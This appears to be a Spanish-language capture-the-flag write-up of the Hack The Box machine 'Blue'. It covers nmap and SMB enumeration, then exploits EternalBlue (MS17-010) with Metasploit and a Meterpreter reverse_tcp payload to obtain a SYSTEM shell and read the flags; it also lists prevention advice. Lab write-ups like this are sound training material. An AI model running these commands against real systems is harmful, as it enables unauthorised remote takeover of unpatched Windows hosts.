---
{"-publish":true,"permalink":"/hack-the-box/machines/easy/blue/","PassFrontmatter":true}
---

Empezamos realizando un escaneo de nmap

```
nmap -sCV 10.10.10.40 -T5 -oN blue_machine -v
```

![[Pasted image 20250522000912.png\|Pasted image 20250522000912.png]]
Observamos que tenemos algunos puertos importantes como el 139 o 445.

Procederemos a hacer una enumeracion basica de smb con el objetivo de detectar el sistema operativo, nombre de host y dominio del equipo remoto.

```
nmap -p 139,445 --script=smb-os-discovery 10.10.10.40
```

![[Pasted image 20250522001503.png\|Pasted image 20250522001503.png]]

Descubrimos que el hostname de Blue vienea ser 'haris-PC', tambien descubrimos que el sistema operativo corriendo en la maquina objetivo es **windows 7**.

Vamos a descubrir cuantos recursos compartidos hay en Blue.

```
nmap -p 445 --script=smb-enum-shares 10.10.10.40
```

Nos retorna lo siguiente, quiere decir que el puerto esta siendo filtrado por un firewall. Es decir, el paquete fue enviado, pero no recibio ninguna respuesta
![[Pasted image 20250522002159.png\|Pasted image 20250522002159.png]]

Al igual con el puerto 139:

![[Pasted image 20250522002327.png\|Pasted image 20250522002327.png]]

Si listamos con smbclient nos sale lo siguiente:
```
smbclient -L //10.10.10.40 -N
```

![[Pasted image 20250522002414.png\|Pasted image 20250522002414.png]]

Pero por practica vamos a usar msfconsole:

- Empezaremos buscando modulos smb utiles:
```
	- search type:auxiliary smb
```

Veremos varios resultados, pero los mas utiles para enumeracion son:

- **auxiliary/scanner/smb/smb_enumshares**
- **auxiliary/scanner/smb/smb_enumusers**
- **auxiliary/scanner/smb/smb_version**
- **auxiliary/scanner/smb/smb_login** (si tienes credenciales)

## Enumerar recursos compatidos smb (shares)
Usaremos credenciales por defecto como por ejemplo: guest

- set RHOSTS 10.10.10.40
- set THREADS 5
- set SMBUser guest
- set SMBPass ""
- run

![[Pasted image 20250522003301.png\|Pasted image 20250522003301.png]]

## Enumerar usuarios smb (users)

![[Pasted image 20250522003642.png\|Pasted image 20250522003642.png]]

Aqui podemos ver que el usuario guest, no tiene permisos suficientes para poder enumerar usuarios, intentaremos con los usuarios.

## Como hemos encontrado recursos compartidos procederemos a ingresar

Para interactuar con los recursos compartidos usaremos smbclient:

```
smbclient //10.10.10.40/shares -N
```

Los unico recursos compartidos con los cuales podemos interactuar son dos: **Share** y **Users**

Intentamos con **Share**:

![[Pasted image 20250522160800.png\|Pasted image 20250522160800.png]]

Intentamos con "Users"

![[Pasted image 20250522004743.png\|Pasted image 20250522004743.png]]

Nada interesante el los recursos compartidos.

Investigando un poco, vemos que existe una vulnerabilidad llamada EternalBlue la cual afecta principalmente a versiones de Windows que tienen el servicio SMBv1 habilitado y sin parches. Fue explotada por el exploit EternalBlue, filtrado por el grupo Shadow Brokers en 2017, y se identifica como:

CVE-2017-0144

Los sisemas que son vulnerables a EternalBlue (si no tienen el parche):

- Windows XP
- Windows Vista
- Windows 7
- Windows 8 (menos comun, pero puede verse afectado)
- Windows Server 2003
- Windows Server 2008
- Windows Server 2012 (en cietas configuraciones con SMBv1)
- Windows 10 (anteriores a marzo de 2017, sin parche)

Que permite hacer EternalBlue?:
- Ejecucion remota de codigo (RCE) a traves del puerto 445/TCP (SMB).
- Se usa para obtener shells remotas sin autenticacion.
- Se popularizo en malware como WannaCry y NotPetya.

Recomendaciones para prevenir:
1. Deshabilitar SMBv1 si no es necesario.
2. Aplicar todos los parches de seguridad de Windows.
3. Bloquear el puerto 445/TCP en firewalls cuando sea posible.

Procedere a probar con un payload de nmap para verificar si esta maquina Windows 7 es vulnerable a EternalBlue.

```
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.40
```

![[Pasted image 20250522163445.png\|Pasted image 20250522163445.png]]

O tambien podemos usar el siguiente payload para enumerar vulnerabiliades conocidas en el SMB:

```
nmap -p 445 --script smb-vuln* 10.10.10.40
```

![[Pasted image 20250522163652.png\|Pasted image 20250522163652.png]]

Algunos payloads extras:
- nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* ip (escaneo combinado completo de SMB)
- nmap -p 445 --script smb-os-discovery,smb-protocols ip (verificar version de SMB y detalles del servidor)
- sudo nmap --script-updatedb (asegurarnos de que nmap tenga los scripts habilitados)

Una vez que hemos identificado la vulnerabilidad, usaremos msfconsole para explotarla.

Iniciamos el msfconsole:

- msfconsole

Cargamos el exploit:

- use exploit/windows/smb/ms17_010_eternalblue

Verificamos las opciones:

- show options

Establecemos la IP del objetivo:

- set RHOSTS 10.10.10.40

Seleccionamos el payload (por ejemplo, Meterpreter):

- set PAYLOAD windows/x64/meterpreter/reverse_tcp
Si el sismte es de 32 bits, usa: windows/meterpreter/reverse_tcp

En este casoo el payload que sirve es el de **x64**

![[Pasted image 20250522164803.png\|Pasted image 20250522164803.png]]

Damos un **shell** en el meterpreter y tenemos nuestra consola de windows interactiva:

![[Pasted image 20250522165214.png\|Pasted image 20250522165214.png]]


Para ver el usuario con el que se ejecuta el exploit usamos **whoami**: 

- nt authority\system

Para encontrar el user.txt nos vamos al usuario **haris**:

- type user.txt

![[Pasted image 20250522165350.png\|Pasted image 20250522165350.png]]

Al igual para el root nos vamos a **Administrator**:

![[Pasted image 20250522165441.png\|Pasted image 20250522165441.png]]

thansk.